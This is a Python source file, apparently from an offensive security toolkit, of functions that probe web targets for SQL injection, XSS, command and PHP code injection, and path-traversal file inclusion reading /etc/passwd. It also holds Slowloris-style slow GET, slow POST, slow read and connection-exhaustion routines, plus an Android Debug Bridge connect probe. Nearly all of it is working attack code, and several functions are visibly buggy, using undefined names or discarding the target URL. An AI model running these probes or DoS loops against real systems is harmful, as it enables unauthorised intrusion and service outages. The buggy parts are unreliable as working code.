#coding: utf-8
import subprocess,os,xtelnet
import requests,socket,random,time,ssl
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import bs4
from bs4 import BeautifulSoup
from bane.payloads import *
from bane.pager import inputs,forms
def sqli_error_based(u,logs=True,user_agent=None,returning=False,timeout=10,proxy=None,cookie=None):
 '''
   this function is to test a given link to check it the target is vulnerable to SQL Injection or not by adding "'" at the end of the line and
   check the response body for any SQL syntax errors.
   it's an "Error Based SQL Injection" test.

   the function takes 4 arguments:

   u: the link to check
   logs: (set by default to: True) showing the process and the report, you can turn it off by setting it to:False
   returning: (set by default to: False) returning an integer indecating the result of the test:
   
   usage:

   >>>import bane
   >>>l='http://www.example.com/product.php?id=2'
   >>>bane.sqlieb(domain)
   
   if returning was set to: True
   False => not vulnerable
   True => vulnerable

   timeout: (set by default to: 10) timeout flag for the request
'''
 s=False
 if proxy:
  proxy={'http':'http://'+proxy}
 if user_agent:
  us=user_agent
 else:
  us=random.choice(ua)
 if cookie:
   hea={'User-Agent': us,'Cookie':cookie}
 else:
   hea={'User-Agent': us}
 if logs==True:
  print("[*]Error Based SQL Injection test")
 try:
  u+="'"
  rp= requests.get(u,headers = hea,proxies=proxy,timeout=timeout,verify=False).text
  for x in sql_errors:
    if x in r:
     s=True
 except Exception as e:
  pass
 if logs==True:
  if s==False:
   print("[-]Not vulnerable")
  if s==True:
   print("[+]Vulnerable!!!")
 if returning==True:
  return s
def sqli_boolean_based(u,logs=True,returning=False,timeout=10,proxy=None,user_agent=None,cookie=None):
 '''
   this function is to test a given link to check it the target is vulnerable to SQL Injection or not by adding boolean opertations to the link
   and check the response body for any change.
   it's an "Boolean Based SQL Injection" test.

   the function takes 4 arguments:

   u: the link to check
   logs: (set by default to: True) showing the process and the report, you can turn it off by setting it to:False
   returning: (set by default to: False) returning an integer indecating the result of the test:
   
   usage:

   >>>import bane
   >>>l='http://www.example.com/product.php?id=2'
   >>>bane.sqlibb(domain)
   
   if returning was set to: True
   False => not vulnerable
   True => vulnerable

   timeout: (set by default to: 10) timeout flag for the request
'''
 if proxy:
  proxy={'http':'http://'+proxy}
 s=False
 if user_agent:
  us=user_agent
 else:
  us=random.choice(ua)
 if cookie:
   hea={'User-Agent': us,'Cookie':cookie}
 else:
   hea={'User-Agent': us}
 try:
  if logs==True:
   print("[*]Boolean Based SQL Injection test")
  r=requests.get(u+" and 1=2",headers=hea,proxies=proxy,timeout=timeout, verify=False)
  q=requests.get(u+" and 1=1",headers=hea,proxies=proxy,timeout=timeout, verify=False)
  r1=r.text
  q1=q.text
  if ((r.status_code==200)and(q.status_code==200)):
   if ((r1!=q1) and (("not found" not in r1.lower()) and ("not found" not in q1.lower()))):
    s=True
 except:
  pass
 if logs==True:
  if s==False:
   print("[-]Not vulnerable")
  if s==True:
   print("[+]Vulnerable!!!")
 if returning==True:
  return s
def sqli_time_based(u,delay=15,db="mysql",logs=True,returning=False,timeout=25,proxy=None,user_agent=None,cookie=None):
 '''
   this function is to test a given link to check it the target is vulnerable to SQL Injection or not by adding a delay statement at the end
   of the line and check the delay of the response.
   it's an "Time Based SQL Injection" test.

   the function takes 5 arguments:

   u: the link to check
   delay: time giving as a delay for the database to do before returning the response
   logs: (set by default to: True) showing the process and the report, you can turn it off by setting it to:False
   returning: (set by default to: False) returning an integer indecating the result of the test:
   
   usage:

   >>>import bane
   >>>l='http://www.example.com/product.php?id=2'
   >>>bane.sqlitb(domain)
   
   if returning was set to: True
   False => not vulnerable
   True => vulnerable

   timeout: (set by default to: 25) timeout flag for the request
'''
 if proxy:
  proxy={'http':'http://'+proxy}
 if user_agent:
  us=user_agent
 else:
  us=random.choice(ua)
 if cookie:
   hea={'User-Agent': us,'Cookie':cookie}
 else:
   hea={'User-Agent': us}
 s=False
 if db.lower()=="mysql":
  sle="-SLEEP({})".format(delay)
 if db.lower()=="sql":
  sle="; WAIT FOR DELAY '00:00:{}'".format(delay)
 if db.lower()=="oracle":
  sle="BEGIN DBMS_LOCK.SLEEP({}); END;".format(delay)
 else:
  return None
 try:
  if logs==True:
   print("[*]Time Based SQL Injection test")
  t=time.time()
  r=requests.get(u+sle,headers=hea,proxies=proxy,timeout=timeout, verify=False)
  if ((time.time()-t>=delay)and (r.status_code==200)):
    s=True
 except:
  pass
 if logs==True:
  if s==False:
   print("[-]Not vulnerable")
  if s==True:
   print("[+]Vulnerable!!!")
 if returning==True:
  return s
def xss_get(u,pl,user_agent=None,extra=None,timeout=10,proxy=None,cookie=None,debug=False):
  '''
   this function is for xss test with GET requests.

   it takes the 4 arguments:
   
   u: link to test
   pl: dictionary contains the paramter and the xss payload
   extra: if the request needs additionnal parameters you can add them there in dictionary format {param : value}
   timeout: timeout flag for the request

  '''
  if user_agent:
   us=user_agent
  else:
   us=random.choice(ua)
  if cookie:
    hea={'User-Agent': us,'Cookie':cookie}
  else:
   hea={'User-Agent': us}
  if proxy:
   proxy={'http':'http://'+proxy}
  for x in pl:
   xp=pl[x]
  d={}
  if extra:
   d.update(extra)
  d.update(pl)
  if debug==True:
   print("\n")
   for x in d:
    print("{} : {}".format(x,d[x]))
   print("\n")
  try:
     c=requests.get(u, params= pl,headers = hea,proxies=proxy,timeout=timeout, verify=False).text
     if  xp in c:
      return True
  except Exception as e:
   pass
  return False
def xss_post(u,pl,user_agent=None,extra=None,timeout=10,proxy=None,cookie=None,debug=False):
  '''
   this function is for xss test with POST requests.

   it takes the 4 arguments:
   
   u: link to test
   pl: dictionary contains the paramter and the xss payload
   extra: if the request needs additionnal parameters you can add them there in dictionary format {param : value}
   timeout: timeout flag for the request

  '''
  if user_agent:
   us=user_agent
  else:
   us=random.choice(ua)
  if cookie:
    hea={'User-Agent': us,'Cookie':cookie}
  else:
   hea={'User-Agent': us}
  if proxy:
   proxy={'http':'http://'+proxy}
  for x in pl:
   xp=pl[x]
  d={}
  if extra:
   d.update(extra)
  d.update(pl)
  if debug==True:
   print("\n")
   for x in d:
    print("{} : {}".format(x,d[x]))
   print("\n")
  try:
     c=requests.post(u, data= d,headers = hea,proxies=proxy,timeout=timeout, verify=False).text
     if xp in c:
      return True 
  except Exception as e:
   pass
  return False
def xss(u,payload=None,fresh=False,logs=True,returning=False,proxy=None,remove_value=["..."],proxies=None,timeout=10,user_agent=None,cookie=None,debug=False):
  '''
   this function is for xss test with both POST and GET requests. it extracts the input fields names using the "inputs" function then test each input using POST and GET methods.

   it takes the following arguments:
   
   u: link to test
   payload: the xss payload to use it, if it's set to: None (set by default to: None) it uses the default payload
   logs: (set by default to: True) show the process
   returning: (set by dfault to: False) to return scan results of the parameters as list of strings

   usage:
  
   >>>import bane
   >>>bane.xss('http://www.example.com/")

   >>>bane.xss('http://www.example.com/',payload="<script>alert(123);</script>")
  '''
  global stop
  stop=False
  if proxy:
   proxy=proxy
  if proxies:
   proxy=random.choice(proxies)
  dic={}
  if payload:
   xp=payload
  else:
   xp='<script>alert("Vulnerable!!!");</script>'
  if logs==True:
   print("Getting forms...")
  hu=True
  fom=forms(u,proxy=proxy,timeout=timeout,value=True,cookie=cookie,user_agent=user_agent)
  if len(fom)==0:
   if logs==True:
    print("No forms were found!!!")
   hu=False
  if hu==True:
   for l1 in fom:
    lst=[]
    u=l1['action']
    if l1['method']=='post':
     post=True
     get=False
    else:
     post=False
     get=True
    if len(inputs(u,proxy=proxy,timeout=timeout,value=True,cookie=cookie,user_agent=user_agent))>0:
     extr=[]
     l=[]
     for x in l1['inputs']:
      if ((x.split(':')[1]!='') and (not any(s in x.split(':')[1] for s in remove_value))):#some websites may introduce in the input certain value that can be replaced ( because the function works only on empty inputs ) , all you have to do is put something which specify it among the others to be ingnored and inject our xss payload there !!
       extr.append(x)
      else:
       l.append(x)
     for x in extr:
      if x.split(':')[0] in l:
       extr.remove(x)
     if logs==True:
      print("\n\nURL: "+u+"\nPayload: "+xp+"\n")
     #if '?' in u:
      #u=u.split('?')[0]
     for i in l:
      if stop==True:
       break
      user=None
      i=i.split(':')[0]
      try:
       if proxies:
        proxy=random.choice(proxies)
       pl={i : xp}
       extra={}
       if len(extr)!=0:
        for x in extr:
         a=x.split(':')[0]
         b=x.split(':')[1]
         extra.update({a:b})
       if get==True: 
        if fresh==True:
         if stop==True:
          break
         extr=[]
         user=random.choice(ua)
         k=inputs(u,user_agent=user,proxy=proxy,timeout=timeout,value=True,cookie=cookie)
         for x in k:
          if ((x.split(':')[1]!='') and (not any(s in x.split(':')[1] for s in remove_value))):
           extr.append(x)
         for x in extr:
          if x.split(':')[0] in l:
           extr.remove(x)
         extra={}
         if len(extr)!=0:
          for x in extr:
           a=x.split(':')[0]
           b=x.split(':')[1]
           extra.update({a:b})
        if stop==True:
         break
        if xss_get(u,pl,user_agent=user,extra=extra,proxy=proxy,timeout=timeout,cookie=cookie,debug=debug)==True:
          x="parameter: '"+i+"' method: 'GET' => [+]Payload was found"
        else:
         x="parameter: '"+i+"' method: 'GET' => [-]Payload was not found"
        lst.append(x)
        if logs==True:
         print (x)
       if post==True:
        if fresh==True:
         if stop==True:
          break
         extr=[]
         user=random.choice(ua)
         k=inputs(u,user_agent=user,proxy=proxy,timeout=timeout,value=True,cookie=cookie)
         for x in k:
          if ((x.split(':')[1]!='') and (not any(s in x.split(':')[1] for s in remove_value))):
           extr.append(x)
         for x in extr:
          if x.split(':')[0] in l:
           extr.remove(x)
         extra={}
         if len(extr)!=0:
          for x in extr:
           a=x.split(':')[0]
           b=x.split(':')[1]
           extra.update({a:b})
        if stop==True:
         break
        if xss_post(u,pl,user_agent=user,extra=extra,proxy=proxy,timeout=timeout,cookie=cookie,debug=debug)==True:
        	x="parameter: '"+i+"' method: 'POST' => [+]Payload was found"
        else:
         x="parameter: '"+i+"' method: 'POST' =>  [-]Payload was not found"
        lst.append(x)
        if logs==True:
         print (x)
      except:
       break
    dic.update({u:lst}) 
   if returning==True:
    return dic
def command_exec_link(u,timeout=10,proxy=None,logs=True,returning=False,user_agent=None,cookie=None):
 '''
   this function is for command execution test using a given link
'''
 s=False
 if proxy:
  proxy={'http':'http://'+proxy}
 if user_agent:
   us=user_agent
 else:
   us=random.choice(ua)
 if cookie:
    hea={'User-Agent': us,'Cookie':cookie}
 else:
   hea={'User-Agent': us}
 u+='; echo alaistestingyoursystem'
 try:
  r=requests.get(u,headers = hea,proxies=proxy,timeout=timeout, verify=False)
  if (r.status_code==200):
   if ("alaistestingyoursystem" in r.text):
    s=True
 except:
  pass
 if logs==True:
  if s==True:
   print("[+]Vulnerable!!!")
  else:
   print("[-]Not vulnerable")
 if returning==True:
  return s
def command_exec_get(u,param='',value='',extra=None,timeout=10,proxy=None,user_agent=None,cookie=None):
 '''
  this function is for command execution test using a given link and GET parameter
'''
 value+=";echo alaistestingyoursystem"
 if user_agent:
   us=user_agent
 else:
   us=random.choice(ua)
 if cookie:
    hea={'User-Agent': us,'Cookie':cookie}
 else:
   hea={'User-Agent': us}
 pl={param:value}
 if extra:
  pl.update(extra)
 try:
  r=requests.get(u,params=pl,headers = hea,proxies=proxy,timeout=timeout, verify=False)
  if (r.status_code==200):
   if ("alaistestingyoursystem" in r.text):
    return True
 except:
  pass
 return False
def command_exec_post(u,param='',value='',extra=None,timeout=10,proxy=None,user_agent=None,cookie=None):
 '''
  this function is for command execution test using a given link and POST parameter
'''
 if proxy:
  proxy={'http':'http://'+proxy}
 if user_agent:
   us=user_agent
 else:
   us=random.choice(ua)
 if cookie:
    hea={'User-Agent': us,'Cookie':cookie}
 else:
   hea={'User-Agent': us}
 value+=";echo alaistestingyoursystem"
 post={param:value}
 if extra:
  post.update(extra)
 try:
  r=requests.post(u,data=post,headers = hea,proxies=proxy,timeout=timeout, verify=False)
  if (r.status_code==200):
   if ("alaistestingyoursystem" in r.text):
    return True
 except exception as e:
  pass
 return False
def php_code_inject_get(u,param='',value='',end=False,extra=None,timeout=10,proxy=None,user_agent=None,cookie=None):
 '''
  this function is for PHP code execution test using a given link and GET parameter
'''
 if proxy:
  proxy={'http':'http://'+proxy}
 if user_agent:
   us=user_agent
 else:
   us=random.choice(ua)
 if cookie:
    hea={'User-Agent': us,'Cookie':cookie}
 else:
   hea={'User-Agent': us}
 if closed==True:
  value+="'"
 value+="; echo'alawashere'"
 if end==True:
  value+=";"
 pl={param:value}
 if extra:
  pl.update(extra)
 try:
  r=requests.get(u,params=pl,headers = hea,proxies=proxy,timeout=timeout, verify=False)
  if (r.status_code==200):
   if ("alawashere" in r.text):
    return True
 except:
  pass
 return False
def php_code_inject_link(u,closed=True,end=False,timeout=10,proxy=None,logs=True,returning=False,user_agent=None,cookie=None):
 '''
  this function is for PHP code execution test using a given link
'''
 s=False
 if user_agent:
   us=user_agent
 else:
   us=random.choice(ua)
 if cookie:
    hea={'User-Agent': us,'Cookie':cookie}
 else:
   hea={'User-Agent': us}
 if proxy:
  proxy={'http':'http://'+proxy}
 u=''
 if closed==True:
  u+="'"
 u+="; echo'alawashere'"
 if end==True:
  u+=";"
 try:
  r=requests.get(u,headers = hea,proxies=proxy,timeout=timeout, verify=False)
  if (r.status_code==200):
   if ("alawashere" in r.text):
    s= True
 except:
  pass
 if logs==True:
  if s==True:
   print("[+]Vulnerable!!!")
  else:
   print("[-]Not vulnerable")
 if returning==True:
  return s
def php_code_inject_post(u,param='',value='',extra=None,end=False,timeout=10,proxy=None,user_agent=None,cookie=None):
 '''
  this function is for PHP code execution test using a given link and POST parameter
'''
 if proxy:
  proxy={'http':'http://'+proxy}
 if user_agent:
   us=user_agent
 else:
   us=random.choice(ua)
 if cookie:
    hea={'User-Agent': us,'Cookie':cookie}
 else:
   hea={'User-Agent': us}
 if closed==True:
  value+="'"
 value+="; echo'alawashere'"
 if end==True:
  value+=";"
 post={param:value}
 if extra:
  post.update(extra)
 try:
  r=requests.post(u,data=post,headers = hea,proxies=proxy,timeout=timeout, verify=False)
  if (r.status_code==200):
   if ("alawashere" in r.text):
    return True
 except:
  pass
 return False
def file_inclusion(u,nullbyte=False,rounds=10,logs=True,returning=False,mapping=False,proxy=None,proxies=None,timeout=10,user_agent=None,cookie=None):
 '''
   this function is for FI vulnerability test using a link
'''
 x={}
 global stop
 stop=False
 if proxy:
  proxy={'http':'http://'+proxy}
 if user_agent:
   us=user_agent
 else:
   us=random.choice(ua)
 if cookie:
    hea={'User-Agent': us,'Cookie':cookie}
 else:
   hea={'User-Agent': us}
 s=False
 l='etc/passwd'
 if (nullbyte==True):
  l+='%00'
 if ("=" not in u):
  return {"Status":s,"Reason":"doesn't work with such urls"}
 else:
  u=u.split("=")[0]+'='
 if mapping==True:
  for i in range(1,rounds+1):
   if stop==True:
    break
   if proxies:
    proxy={'http':'http://'+random.choice(proxies)}
   try:
    if logs==True:
     print("[*]Trying: "+ u+l)
    r=requests.get(u+l,headers=hea,proxies=proxy,timeout=timeout, verify=False)
    if ("root:x:0:0:" in r.text):
     s=True
     x= {"Status":s,"../ added": i,"Nullbyte":nullbyte,'Link':r.url}
     if logs==True:
      print("[+]FOUND!!!")
     break
    elif (r.status_code!=200):
     x= {"Status":s,"Reason":"protected"}
     if logs==True:
      print("[-]Status Code:',r.status_code,',something is wrong...")
     break
    else:
     l='../'+l
     if logs==True:
      print("[-]Failed")
   except Exception as e:
    pass
 else:
  l='/etc/passwd'
  if (nullbyte==True):
   l+='%00'
  try:
    if logs==True:
     print("[*]Trying: "+u+l)
    r=requests.get(u+l,headers=hea,proxies=proxy,timeout=timeout, verify=False)
    if ("root:x:0:0:" in r.text):
     s=True
     x= {"Status":s,"Nullbyte":nullbyte,'Link':r.url}
     if logs==True:
      print("[+]FOUND!!!")
    elif (r.status_code!=200):
     x= {"Status":s,"Reason":"protected"}
     if logs==True:
      print("[-]Status Code:',r.status_code,',something went wrong...")
    else:
     if logs==True:
      print("[-]Failed")
  except Exception as e:
    if logs==True:
     print("[-]Error Failure")
 if s==False:
  x= {"Status":s,"Reason":"not vulnerable"}
 if returning==True:
  return x
'''
  the following functions are used to check any kind of Slow HTTP attacks vulnerabilities that will lead to a possible DoS.
'''
def build_get(u,p,timeout=5):
    s =socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((u,p))
    if ((p==443 ) or (p==8443)):
     s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    s.send("GET {} HTTP/1.1\r\n".format(random.choice(paths)).encode("utf-8"))
    s.send("User-Agent: {}\r\n".format(random.choice(ua)).encode("utf-8"))
    s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
    s.send("Connection: keep-alive\r\n".encode("utf-8"))
    return s
def headers_timeout_test(u,port=80,timeout=5,max_timeout=30,logs=True,returning=False):
 global stop
 stop=False
 i=0
 if logs==True:
  print("[*]Test has started:\nTarget: {}\nPort: {}\nInitial connection timeout: {}\nMax interval: {}".format(u,port,timeout,max_timeout))
 try:
  s=build_get(u,port,timeout=timeout)
  i+=1
 except:
  if logs==True:
   print("[-]Connection failed")
  if returning==True:
   return 0
 if i>0:
  j=0
  while True:
   if stop==True:
    break
   try:
    j+=1
    if j>max_timeout:
     break
    if logs==True:
     print("[*]Sending payload...")
    s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
    if logs==True:
     print("[+]Sleeping for {} seconds...".format(j))
    time.sleep(j)
   except:
    if logs==True:
     print("==>timed out at: {} seconds".format(j))
     break
    if returning==True:
     return j
  if j>max_timeout:
   if logs==True:
    print("==>Test has reached the max interval: {} seconds without timing out".format(duration))
   if returning==True:
    return j
def slow_get_test(u,port=80,timeout=5,interval=5,randomly=False,duration=180,logs=True,returning=False,min_wait=1,max_wait=5):
 global stop
 stop=False
 i=0
 if logs==True:
  print("[*]Test has started:\nTarget: {}\nPort: {}\nInitial connection timeout: {}\nInterval between packets:{}\nTest duration: {} seconds".format(u,port,timeout,interval,duration))
 try:
  s=build_get(u,port,timeout=timeout)
  i+=1
 except:
  if logs==True:
   print("[-]Connection failed")
  if returning==True:
   return 0
 if i>0:
  j=time.time()
  while True:
   if stop==True:
    break
   try:
    ti=time.time()
    if int(ti-j)>=duration:
     break
    if logs==True:
     print("[*]Sending payload...")
    s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
    t=interval
    if randomly==True:
     t=random.randint(min_wait,max_wait)
    if logs==True:
     print("[+]Sleeping for {} seconds...".format(t))
    time.sleep(t)
   except Exception as e:
    pass
    if logs==True:
     print("==>timed out at: {} seconds".format(int(ti-j)))
    if returning==True:
     return int(ti-j)
    break
  if int(ti-j)>=duration:
   if logs==True:
    print("==>Test has reached the max interval: {} seconds without timing out".format(duration))
   if returning==True:
    return int(ti-j)
def max_connections_limit(u,port=80,connections=150,timeout=5,duration=180,logs=True,returning=False,payloads=True):
 global stop
 stop=False
 l=[]
 if logs==True:
  print("[*]Test has started:\nTarget: {}\nPort: {}\nConnections to create: {}\nInitial connection timeout: {}\nTest duration: {} seconds".format(u,port,connections,timeout,duration))
 ti=time.time()
 while True:
  if stop==True:
    break
  if int(time.time()-ti)>=duration:
   if logs==True:
    print("[+]Maximum time for test has been reached!!!")
    break
   if returning==True:
    return len(l)
  if len(l)==connections:
   if logs==True:
    print("[+]Maximum number of connections has been reached!!!")
   if returning==True:
    return connections 
   break
  try:
   so=build_get(u,port,timeout=timeout)
   l.append(so)
  except Exception as e:
   pass
  if payloads==True:
   for s in l:
    try:
     s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
    except:
     l.remove(s)
  if logs==True:
   print("[!]Sockets: {} Time: {} seconds".format(len(l),int(time.time()-ti)))
def build_post(u,p,timeout=5,size=10000):
 s =socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.settimeout(timeout)
 s.connect((u,p))
 if ((p==443 ) or (p==8443)):
  s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
 s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n".format(random.choice(paths),random.choice(ua),random.randint(300,1000),size,u).encode("utf-8"))
 return s
def slow_post_test(u,port=80,logs=True,timeout=5,size=10000,duration=180,returning=False,randomly=False,wait=1,min_wait=1,max_wait=5):
 global stop
 stop=False
 i=0
 if logs==True:
  print("[*]Test has started:\nTarget: {}\nPort: {}\nData length to post: {}\nInitial connection timeout:{}\nTest duration: {} seconds".format(u,port,size,timeout,duration))
 try:
  s=build_post(u,port,timeout=timeout,size=size)
  i+=1
 except Exception as e:
  if logs==True:
   print("[-]Connection failed")
  if returning==True:
   return 0
 j=0
 if i>0:
  t=time.time()
  while True:
   if stop==True:
    break
   if int(time.time()-t)>=duration:
    if logs==True:
     print("[+]Maximum time has been reached!!!\n==>Size: {}\n==>Time: {}".format(j,int(time.time()-t)))
    if returning==True:
     return int(time.time()-t)
    break
   if j==size:
    if logs==True:
     print("[+]Maximum size has been reached!!!\n==>Size: {}\n==>Time: {}".format(j,int(time.time()-t)))
    if returning==True:
     return int(time.time()-t)
    break
   try:
    h=random.choice(lis)
    s.send(h.encode("utf-8"))
    j+=1
    if logs==True:
     print("Posted: {}".format(h))
    if randomly==True:
     time.sleep(random.randint(min_wait,max_wait))
    if randomly==False:
     try:
      time.sleep(wait)
     except KeyboardInterrupt:
      if logs==True:
       print("[-]Cant send more\n==>Size: {}\n==>Time:{}".format(j,int(time.time()-t)))
      if returning==True:
       return int(time.time()-t)
      break
   except Exception as e:
    if logs==True:
     print("[-]Cant send more\n==>Size: {}\n==>Time:{}".format(j,int(time.time()-t)))
    if returning==True:
     return int(time.time()-t)
    break
def slow_read_test(u,port=80,logs=True,timeout=5,duration=180,returning=False,randomly=False,wait=5,min_wait=1,max_wait=10):
  global stop
  stop=False
  i=0
  if logs==True:
   print("[*]Test has started:\nTarget: {}\nPort: {}\nInitial connection timeout: {}\nTest duration: {} seconds".format(u,port,timeout,duration))
  ti=time.time()
  try: 
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((u,port))
    if ((port==443 ) or (port==8443)):
     s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    while True:
     if stop==True:
      break
     if time.time()-ti>=duration:
      if logs==True:
       print("[+]Maximum time has been reached!!!")
      if returning==True:
       return int(time.time()-ti)
      break
     pa=random.choice(paths)
     try:
      g=random.randint(1,2)
      if g==1:
       s.send("GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nHost: {}\r\n\r\n".format(pa,random.choice(ua),random.randint(300,1000),u).encode("utf-8"))
      else:
       q='q='
       for i in range(10,random.randint(20,50)):
        q+=random.choice(lis)
       s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),random.randint(300,1000),len(q),u,q).encode("utf-8"))
      d=s.recv(random.randint(1,3))
      if logs==True:
       print("Received: {}".format(str(d.decode('utf-8'))))
      print("sleeping...")
      if randomly==True:
       time.sleep(random.randint(min_wait,max_wait))
      if randomly==False:
       time.sleep(wait)
     except:
      break
    s.close()
  except Exception as e:
    pass
  if logs==True:
   print("==>connection closed at: {} seconds".format(int(time.time()-ti)))
  if returning==True:
   return int(time.time()-ti)
def adb_exploit(u,timeout=5,port=5555):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((u,port))
        s.send(b"CNXN\x00\x00\x00\x01\x00\x10\x00\x00\x07\x00\x00\x00\x32\x02\x00\x00\xbc\xb1\xa7\xb1host::\x00") 
        c=s.recv(4096)
        s.close()
        if "CNXN" in str(c):
            return True
    except Exception as e:
        pass
    return False
def exposed_telnet(u,p=23,timeout=5):
 try:
  t=xtelnet.session()
  t.connect(u,p=p,timeout=timeout)
  t.close()
  return True
 except:
  pass
 return False
